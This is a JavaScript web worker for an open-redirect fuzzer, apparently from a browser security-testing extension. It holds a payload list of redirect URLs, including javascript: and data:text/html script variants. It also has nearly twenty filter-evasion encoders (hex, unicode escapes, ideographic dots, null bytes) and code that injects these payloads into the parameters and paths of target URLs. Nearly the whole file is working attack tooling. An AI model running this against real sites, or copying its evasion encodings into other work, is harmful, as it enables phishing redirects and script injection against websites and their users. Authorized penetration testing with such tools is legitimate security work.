/**
 * Web worker for fuzzer-open-redirect.
 */

let bufferLengthURLs = 20;
let delayThrottleURLIndexing = 300;
let delayThrottleURLPathInjection = 100;
let delayURLInjectionThread = 2000;
let delayURLScannerThread = 2000;
let encodingTypes = [
  [0],
  [0, 0],
  [0, 4],
  [1],
  [2],
  [3],
  [4],
  [4, 0],
  [4, 4],
  [5],
  [6],
  [7],
  [8],
  [9],
  [10],
  [11],
  [12],
  [13],
  [14],
  [14, 0],
  [14, 4],
  [15],
  [15, 0],
  [15, 4],
  [16],
  [16, 0],
  [16, 4],
  [17],
  [17, 0],
  [17, 4],
  [18],
  [18, 0],
  [18, 4],
];
let encodedRedirectURLVariants = [];
let injectedRedirectParameterURLs = [];
let injectedParameterURLs = [];
let injectedPathURLs = [];
let injectableParameterURLs = [];
let injectableParameterURLsBuffer = [];
let injectablePathURLs = [];
let injectablePathURLsBuffer = [];
let matchSetPermutations = [];
let redirectURLs = [
  "https://runescape.com",
  "https://runescape.com/",
  "https://runescape.com/splash",
  "https://runescape.com/splash?ing",
  "http://runescape.com",
  "http://runescape.com/",
  "http://runescape.com/splash",
  "http://runescape.com/splash?ing",
  "//runescape.com",
  "//runescape.com/",
  "//runescape.com/splash",
  "//runescape.com/splash?ing",
  "runescape.com",
  "runescape.com/",
  "runescape.com/splash",
  "runescape.com/splash?ing",
  "data:text/html,<script>location='https://runescape.com'</script>",
  "javascript:location='https://runescape.com'",
  "javascript:location='//runescape.com'",
];
let redirectURLsForPathExploitation = [];
let scannableURLs = [];
let scannableURLsBuffer = [];
let threadCount;

const alphabeticalChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
const regexpSelectorEscapableURICharacters = /[^A-Za-z0-9_.!~*'()-]/ig;
const regexpSelectorURLParameterValue = /=[^&]*/g;
const regexpSelectorURLRedirectParameter = /^[=](?:http|%68%74%74%70|[/]|[?]|%[23]f)/i;

/**
 * Buffered and throttled method that returns the index of a given target object in a given
 * array.
 */
const bufferedIndexOf = async (arr, target, bufferLength, throttleDuration) => {
  const amountOfChunks = Math.ceil(arr / bufferLength);
  for (let a = 0; a < amountOfChunks; a++) {
    for (
      let b = a * bufferLengthURLs;
         b < arr.length
      && b < (a * bufferLengthURLs) + bufferLengthURLs - 1;
      b++
    ) {
      if (arr[b] === target) {
        return b;
      }
    }
    await sleep(throttleDuration);
  }
  return -1;
};

/**
 * Chunks a given array to a given length.
 */
const chunkArrayToAmountOfChunks = (array, amountOfChunks) => {
  const chunkSize = Math.ceil(array.length / amountOfChunks);
  const chunks = new Array(amountOfChunks);
  for (let a = 0; a < amountOfChunks; a++) {
    chunks[a] = array.slice(chunkSize * a, (chunkSize * a) + chunkSize);
  }
  return chunks;
};

/**
 * An integer mapped collection of methods to encode a given URI parameter string.
 */
const encodeMethods = {
  0: globalThis.encodeURIComponent,
  1: str => {
    /**
     *  Returns a string exactly like globalThis.encodeURIComponent does, with lowercase hex
     *  encoding.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (str.charAt(a).match(regexpSelectorEscapableURICharacters)) {
        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  2: str => {
    /**
     * Returns a lowercase hex encoded string (type 1) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https%3a%2f%2fmyredirectsite%2ecom%2f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a) === -1)) {
        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  3: str => {
    /**
     * Returns an uppercase hex encoded string (type 1) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https%3A%2F%2Fmyredirectsite%2Ecom%2F")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a) === -1)) {
        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toUpperCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  4: str => {
    /**
     * Returns a lowercase hex encoded string (type 2) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "%68%74%74%70%73%3a%2f%2f%6d%79%72%65%64%69%72%65%63%74%73%69%74%65%2e%63%6f%6d%2f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
    }
    return encodedBuffer.join("");
  },
  5: str => {
    /**
     * Returns an uppercase hex encoded string (type 2) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "%68%74%74%70%73%3A%2F%2F%6D%79%72%65%64%69%72%65%63%74%73%69%74%65%2E%63%6F%6D%2F")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toUpperCase();
    }
    return encodedBuffer.join("");
  },
  6: str => {
    /**
     * Returns a lowercase hex encoded string (type 3) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https\\u003a\\u002f\\u002fmyredirectsite\\u002ecom\\u002f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
        encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toLowerCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  7: str => {
    /**
     * Returns an uppercase hex encoded string (type 3) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https\\u003A\\u002F\\u002Fmyredirectsite\\u002Ecom\\u002f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
        encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toUpperCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  8: str => {
    /**
     * Returns a lowercase hex encoded string (type 4) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006d\\u0079\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u0073\\u0069\\u0074\\u0065\\u002e\\u0063\\u006f\\u006d\\u002f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toLowerCase();
    }
    return encodedBuffer.join("");
  },
  9: str => {
    /**
     * Returns an uppercase hex encoded string (type 4) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "\\u0068\\u0074\\u0074\\u0070\\u0073\\u003A\\u002F\\u002F\\u006D\\u0079\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u0073\\u0069\\u0074\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toUpperCase();
    }
    return encodedBuffer.join("");
  },
  10: str => {
    /**
     * Returns a lowercase hex encoded string (type 5) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https\\x3a\\x2f\\x2fmyredirectsite\\x2ecom\\x2f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
        encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toLowerCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  11: str => {
    /**
     * Returns an uppercase hex encoded string (type 5) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "https\\x3A\\x2F\\x2Fmyredirectsite\\x2Ecom\\x2f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
        encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toUpperCase();
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  12: str => {
    /**
     * Returns a lowercase hex encoded string (type 6) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x6d\\x79\\x72\\x65\\x64\\x69\\x72\\x65\\x63\\x74\\x73\\x69\\x74\\x65\\x2e\\x63\\x6f\\x6d\\x2f")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toLowerCase();
    }
    return encodedBuffer.join("");
  },
  13: str => {
    /**
     * Returns an uppercase hex encoded string (type 6) using a given string.
     * (example input: "https://myredirectsite.com/")
     * (example output: "\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x6D\\x79\\x72\\x65\\x64\\x69\\x72\\x65\\x63\\x74\\x73\\x69\\x74\\x65\\x2E\\x63\\x6F\\x6D\\x2F")
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toUpperCase();
    }
    return encodedBuffer.join("");
  },
  14: str => {
    /**
     *  Replaces full stops with ideographic full stops.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      if (str.charAt(a) === ".") {
        encodedBuffer[a] = "。";
      } else {
        encodedBuffer[a] = str.charAt(a);
      }
    }
    return encodedBuffer.join("");
  },
  15: str => {
    /**
     *  Returns a given string with a null byte between each character.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = str.charAt(a);
    }
    return encodedBuffer.join("\x00");
  },
  16: str => {
    /**
     *  Returns a given string with a URL encoded null byte between each character.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = str.charAt(a);
    }
    return encodedBuffer.join("%00");
  },
  17: str => {
    /**
     *  Returns a given string with a hex encoded null byte (type 17) between each character.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = str.charAt(a);
    }
    return encodedBuffer.join("\\u0000");
  },
  18: str => {
    /**
     *  Returns a given string with a hex encoded null byte (type 18) between each character.
     */
    let encodedBuffer = new Array(str.length);
    for (let a = 0; a < str.length; a++) {
      encodedBuffer[a] = str.charAt(a);
    }
    return encodedBuffer.join("\\x00");
  },
};

/**
 * Encodes all specified redirect URIs.
 */
const encodeRedirectURLs = async () => {
  encodedRedirectURLVariants = [];
  for (let a = 0; a < redirectURLs.length; a++) {
    encodedRedirectURLVariants = encodedRedirectURLVariants.concat(
      await getEncodedVariants(redirectURLs[a]));
  }
};

/**
 * Appends all possible permutations of a given array to matchSetPermutations.
 */
const getArrayPermutations = (prefix, arr) => {
  for (let a = 0; a < arr.length; a++) {
    matchSetPermutations.push(prefix.concat(arr[a]));
    getArrayPermutations(prefix.concat(arr[a]), arr.slice(a + 1));
  }
};

/**
 * Returns an array of URLs that are encoded as per the specified encodingTypes value.
 */
const getEncodedVariants = async url => {
  if (url.length === 0) {
    console.error("Empty string parameter passed through getEncodedVariants.");
    return [];
  }
  let URLVariants = [];
  for (let a = 0; a < encodingTypes.length; a++) {
    let URLVariant = url;
    const encodingTypeSet = encodingTypes[a];
    for (let b = 0; b < encodingTypeSet.length; b++) {
      URLVariant = encodeMethods[encodingTypeSet[b]](URLVariant);
    }
    URLVariants.push(URLVariant);
  }
  return URLVariants;
};

/**
 * Returns an array of all injected permutations of a given URL.
 * (example input: (
 *   "//www.google.com/q=http%3A%2F%2Fgmail%2Ecom%2F",
 *   %2F%2Fmysite%2Ecom%2F",
 * ))
 */
const getInjectedURLPermutations = async (targetURL, redirectURL) => {
  const parsedURL = parseURL(targetURL);
  if (parsedURL[4].length === 0) {
    console.error("URL contains no search:", targetURL);
    return [];
  }
  let regexpMatches = {
    injectableParameterURLs: [],
    injectableRedirectParameterURLs: [],
  };
  let match;
  while (match = regexpSelectorURLParameterValue.exec(parsedURL[4])) {
    if (match[0].match(regexpSelectorURLRedirectParameter)) {
      regexpMatches.injectableRedirectParameterURLs.push({
        index: match.index,
        match: match[0],
      });
    } else {
      regexpMatches.injectableParameterURLs.push({
        index: match.index,
        match: match[0],
      });
    }
  }
  /* Inject all URL parameters. */
  matchSetPermutations = [];
  getArrayPermutations([], regexpMatches.injectableParameterURLs);
  let newInjectedParameterURLs = [];
  for (let a = 0; a < matchSetPermutations.length; a++) {
    let matchSets = matchSetPermutations[a];
    let injectedSearch = parsedURL[4];
    for (let b = 0; b < matchSets.length; b++) {
      const matchSet = matchSets[b];
      const lengthLeadingMatches = matchSets.slice(0, b)
        .map(set => { return set.match }).join("").length;
      const search_ = injectedSearch.slice(
        0,
        matchSet.index
          + (b * (redirectURL.length + 1))
          - lengthLeadingMatches);
      const _search = injectedSearch.slice(
        matchSet.index
          + ((b * (redirectURL.length + 1)) - lengthLeadingMatches)
          + (matchSet.match.length));
      injectedSearch = search_ + "=" + redirectURL + _search;
    }
    const injectedURL = parsedURL.slice(0, 4).join("") + injectedSearch + parsedURL[5];
    newInjectedParameterURLs.push(injectedURL);
  }
  /* Inject redirect URL parameters. */
  matchSetPermutations = [];
  getArrayPermutations([], regexpMatches.injectableRedirectParameterURLs);
  let newInjectedRedirectParameterURLs = [];
  for (let a = 0; a < matchSetPermutations.length; a++) {
    let matchSets = matchSetPermutations[a];
    let injectedSearch = parsedURL[4];
    for (let b = 0; b < matchSets.length; b++) {
      const matchSet = matchSets[b];
      const lengthLeadingMatches = matchSets.slice(0, b)
        .map(set => { return set.match }).join("").length;
      const search_ = injectedSearch.slice(
        0,
        matchSet.index
          + (b * (redirectURL.length + 1))
          - lengthLeadingMatches);
      const _search = injectedSearch.slice(
        matchSet.index
          + ((b * (redirectURL.length + 1)) - lengthLeadingMatches)
          + (matchSet.match.length));
      injectedSearch = search_ + "=" + redirectURL + _search;
    }
    const injectedURL = parsedURL.slice(0, 4).join("") + injectedSearch + parsedURL[5];
    newInjectedRedirectParameterURLs.push(injectedURL);
  }
  return {
    newInjectedParameterURLs: newInjectedParameterURLs,
    newInjectedRedirectParameterURLs: newInjectedRedirectParameterURLs,
  };
};

/**
 * Returns an array containing the protocol, host, port, path, search and hash of a
 * given URL if found.
 * (example input: "/path/to/file?v=4.4.2#hash")
 * (example output: [
 *   "",
 *   "",
 *   "",
 *   "/path/to/file",
 *   "?v=4.4.2",
 *   "#hash"
 * ])
 */
const parseURL = url => {
  const strippedURL = trimWhitespaces(url);
  const retval = ["","","","","",""];
  /* protocol */
  retval[0] = strippedURL.replace(/^((?:[a-z0-9.+-]+[:])(?:[/][/])?|(?:[a-z0-9.+-]+[:])?[/][/])?.*/i, "$1");
  const protocol = retval[0].toLowerCase();
  if (
       protocol === "data:"
    || protocol === "javascript:"
  ) {
    retval[3] = url.slice(retval[0].length);
    return retval;
  }
  /* host */
  if (protocol !== "") {
    retval[1] = strippedURL.slice(retval[0].length).replace(/^((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})|(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9]))?.*/i, "$1");
  }
  /* port */
  retval[2] = strippedURL.slice(retval[0].length + retval[1].length).replace(/^([:][1-9][0-9]{0,4})?.*/i, "$1");
  /* path */
  retval[3] = strippedURL.slice(retval[0].length + retval[1].length + retval[2].length).replace(/^([^?#]+)?.*/i, "$1");
  /* search */
  retval[4] = strippedURL.slice(retval[0].length + retval[1].length + retval[2].length + retval[3].length).replace(/^([?][^#]*)?.*/i, "$1");
  /* hash */
  retval[5] = strippedURL.slice(retval[0].length + retval[1].length + retval[2].length + retval[3].length + retval[4].length);
  return retval;
};

/**
 * Creates a filtered array of redirect URLs that can be used to exploit paths.
 */
const prepareRedirectURLsForPathExploitation = async () => {
  let filteredURLs = [];
  for (let a = 0; a < redirectURLs.length; a++) {
    const parsedURL = parseURL(redirectURLs[a]);
    if (
         parsedURL[0].length !== 0
      && parsedURL[0].toLowerCase() !== "data:"
      && parsedURL[0].toLowerCase() !== "javascript:"
    ) {
      const pathExploitingRedirectURL = "//" + parsedURL.slice(1, 4).join("");
      if (filteredURLs.indexOf(pathExploitingRedirectURL) === -1) {
        filteredURLs.push(pathExploitingRedirectURL);
      }
    }
  }
  redirectURLsForPathExploitation = filteredURLs;
};

/**
 * Register message listener.
 */
const registerMessageListener = () => {
  globalThis.onmessage = message => {
    if (message.data) {
      if (message.data.threadCount) {
        threadCount = message.data.threadCount;
      }
      if (
           message.data.injectableParameterURLs
        && message.data.injectableParameterURLs.length !== 0
      ) {
        injectableParameterURLsBuffer = injectableParameterURLsBuffer.concat(
          message.data.injectableParameterURLs);
      }
      if (
           message.data.scannableURLs
        && message.data.scannableURLs.length !== 0
      ) {
        scannableURLsBuffer = scannableURLsBuffer.concat(message.data.scannableURLs)
        injectablePathURLsBuffer = injectablePathURLsBuffer.concat(
          message.data.scannableURLs);
      }
    }
  };
};

/**
 * Starts creating injected permutations of an indefinite amount of injected URLs.
 */
const startURLParameterInjectionThread = async () => {
  while (true) {
    if (injectableParameterURLsBuffer.length !== 0) {
      let newInjectedParameterURLs = [];
      let newInjectedRedirectParameterURLs = [];
      let amountOfChunks = Math.ceil(
        injectableParameterURLs.length / bufferLengthURLs);
      for (let a = 0; a < amountOfChunks; a++) {
        for (
          let b = a * bufferLengthURLs;
             b < injectableParameterURLs.length
          && b < (a * bufferLengthURLs) + bufferLengthURLs - 1;
          b++
        ) {
          if (injectableParameterURLs[b] === injectableParameterURLsBuffer[0]) {
            injectableParameterURLsBuffer = injectableParameterURLsBuffer.slice(1);
          }
        }
        await sleep(delayThrottleURLIndexing);
      }
      if (injectableParameterURLsBuffer.length !== 0) {
        const newExploitableURL = injectableParameterURLsBuffer[0]
        injectableParameterURLs = injectableParameterURLs.concat(newExploitableURL);
        injectableParameterURLsBuffer = injectableParameterURLsBuffer.slice(1);
        amountOfChunks = Math.ceil(encodedRedirectURLVariants.length / bufferLengthURLs);
        for (let a = 0; a < amountOfChunks; a++) {
          for (
            let b = a * bufferLengthURLs;
               b < encodedRedirectURLVariants.length
            && b < (a * bufferLengthURLs) + bufferLengthURLs - 1;
            b++
          ) {
            const injectedPermutations = await getInjectedURLPermutations(
              newExploitableURL,
              encodedRedirectURLVariants[b]);
            newInjectedParameterURLs = newInjectedParameterURLs.concat(
              injectedPermutations.newInjectedParameterURLs);
            newInjectedRedirectParameterURLs = newInjectedRedirectParameterURLs.concat(
              injectedPermutations.newInjectedRedirectParameterURLs);
          }
          await sleep(delayThrottleURLIndexing);
        }
        let filteredNewInjectedParameterURLs = [];
        for (let a = 0; a < newInjectedParameterURLs.length; a++) {
          if (
              await bufferedIndexOf(
                filteredNewInjectedParameterURLs,
                newInjectedParameterURLs[a],
                bufferLengthURLs,
                delayThrottleURLIndexing) === -1
           && await bufferedIndexOf(
                injectedParameterURLs,
                newInjectedParameterURLs[a],
                bufferLengthURLs,
                delayThrottleURLIndexing) === -1
          ) {
            filteredNewInjectedParameterURLs.push(newInjectedParameterURLs[a]);
          }
        }
        let filteredNewInjectedRedirectParameterURLs = [];
        for (let a = 0; a < newInjectedRedirectParameterURLs.length; a++) {
          if (
               await bufferedIndexOf(
                 filteredNewInjectedRedirectParameterURLs,
                 newInjectedRedirectParameterURLs[a],
                 bufferLengthURLs,
                 delayThrottleURLIndexing) === -1
            && await bufferedIndexOf(
                 injectedRedirectParameterURLs,
                 newInjectedRedirectParameterURLs[a],
                 bufferLengthURLs,
                 delayThrottleURLIndexing) === -1
              ) {
            filteredNewInjectedRedirectParameterURLs.push(
              newInjectedRedirectParameterURLs[a]);
          }
        }
        if (filteredNewInjectedParameterURLs.length !== 0) {
          injectedParameterURLs = injectedParameterURLs.concat(
            filteredNewInjectedParameterURLs);
          postMessage({
            appendage: {
              injectedParameterURLsQueue: filteredNewInjectedParameterURLs
            }
          });
        }
        if (filteredNewInjectedRedirectParameterURLs.length !== 0) {
          injectedRedirectParameterURLs = injectedRedirectParameterURLs.concat(
            filteredNewInjectedRedirectParameterURLs);
          postMessage({
            appendage: {
              injectedRedirectParameterURLsQueue: filteredNewInjectedRedirectParameterURLs
            }
          });
        }
      }
    }
    await sleep(delayURLInjectionThread);
  }
};

/**
 * Starts injecting an indefinite amount of URLs with paths using the specified redirect
 * URLs that contain a path.
 */
const startURLPathInjectionThread = async () => {
  while (true) {
    if (injectablePathURLsBuffer.length !== 0) {
      let newInjectedPathURLs = [];
      let filteredURLs = []
      let amountOfChunks = Math.ceil(injectablePathURLsBuffer.length / bufferLengthURLs);
      while (
           injectablePathURLsBuffer.length !== 0
        && await bufferedIndexOf(
             injectablePathURLs,
             injectablePathURLsBuffer[0],
             bufferLengthURLs,
             delayThrottleURLIndexing) !== -1
      ) {
        injectablePathURLsBuffer = injectablePathURLsBuffer.slice(1);
        await sleep(delayThrottleURLIndexing);
      }
      if (injectablePathURLsBuffer.length !== 0) {
        const injectablePathURL = injectablePathURLsBuffer[0];
        injectablePathURLsBuffer = injectablePathURLsBuffer.slice(1);
        const parsedInjectablePathURL = parseURL(injectablePathURL);
        if (parsedInjectablePathURL[3].length !== 0) {
          let newInjectedPathURLs = [];
          const pathEntries = parsedInjectablePathURL[3].split("/");
          for (let a = 0; a < pathEntries.length + 1; a++) {
            for (let b = 0; b < redirectURLsForPathExploitation.length; b++) {
              const injectedURL = parsedInjectablePathURL.slice(0, 3).join("") +
                pathEntries.slice(0, a).join("/") + redirectURLsForPathExploitation[b] +
                parsedInjectablePathURL.slice(5, 6).join("");
              if (
                   await bufferedIndexOf(
                     newInjectedPathURLs,
                     injectedURL,
                     bufferLengthURLs,
                     delayThrottleURLIndexing) === -1
                && await bufferedIndexOf(
                     injectedPathURLs,
                     injectedURL,
                     bufferLengthURLs,
                     delayThrottleURLIndexing) === -1
              ) {
                newInjectedPathURLs.push(injectedURL);
              }
            }
            await sleep(delayThrottleURLPathInjection);
          }
          if (newInjectedPathURLs.length !== 0) {
            injectedPathURLs = injectedPathURLs.concat(newInjectedPathURLs);
            postMessage({
              appendage: {
                injectedPathURLsQueue: newInjectedPathURLs
              }
            });
          }
        }
      }
    }
    await sleep(delayURLInjectionThread);
  }
};

/**
 * Starts scanning an indefinite amount of URLs in scope.
 */
const startURLScannerThread = async () => {
  while (true) {
    if (scannableURLsBuffer.length !== 0) {
      while (
           scannableURLsBuffer.length !== 0
        && await bufferedIndexOf(
             scannableURLs,
             scannableURLsBuffer[0],
             bufferLengthURLs,
             delayThrottleURLIndexing) !== -1
      ) {
        scannableURLsBuffer = scannableURLsBuffer.slice(1);
        await sleep(delayThrottleURLIndexing);
      }
      if (scannableURLsBuffer.length !== 0) {
        const newScannableURL = scannableURLsBuffer[0];
        scannableURLsBuffer = scannableURLsBuffer.slice(1);
        scannableURLs = scannableURLs.concat(newScannableURL);
        postMessage({
          appendage: {
            scannableURLsQueue: [newScannableURL]
          }
        });
      }
    }
    await sleep(delayURLScannerThread);
  }
};

/**
 * Sleeps an awaited promise value for the given amount of milliseconds.
 */
const sleep = async ms => {
  return new Promise(res => {
    setTimeout(res, ms);
  });
};

/**
 * Trims all leading and trailing whitespaces off a given string.
 * (example input: " https://example.com/  \n")
 * (example output: "https://example.com/")
 */
const trimWhitespaces = str => {
  return str.replace(/^\s*(.*)\s*$/g, "$1");
};

/* Init worker. */
(async () => {
  await prepareRedirectURLsForPathExploitation();
  await encodeRedirectURLs();
  await registerMessageListener();
  startURLParameterInjectionThread();
  startURLPathInjectionThread();
  startURLScannerThread();
})();

